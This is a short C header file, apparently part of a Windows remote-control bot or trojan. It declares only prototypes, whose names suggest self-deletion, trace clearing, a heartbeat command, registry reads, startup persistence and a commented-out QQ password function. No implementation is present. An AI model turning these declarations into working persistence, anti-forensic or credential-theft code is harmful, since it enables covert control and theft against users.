// processcmd.h: interface for the processcmd class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_PROCESSCMD_H__2B219B68_BC0E_414C_BBEF_EFDBF938F7EE__INCLUDED_)
#define AFX_PROCESSCMD_H__2B219B68_BC0E_414C_BBEF_EFDBF938F7EE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

BOOL DestroySelf(const char * szKeyName, const WCHAR * SelfName, const WCHAR *SelfPath);
BOOL ClearSit();
DWORD Cmd_Destory(char* pPara);

DWORD CheckFileMD5(DWORD* pPara);

BOOL SetHeadSign(DWORD* pPara);

DWORD Cmd_AckHeart(DWORD* pPara);

DWORD FlashBuffer(DWORD* pPara);

DWORD GetRegedit(DWORD* pPara);

DWORD AddRunCmd(DWORD* pPara);

void AddRun();

DWORD AddFolderRunCmd(DWORD *pPara);

//BOOL DelQQPass(DWORD* pPara);

#endif // !defined(AFX_PROCESSCMD_H__2B219B68_BC0E_414C_BBEF_EFDBF938F7EE__INCLUDED_)
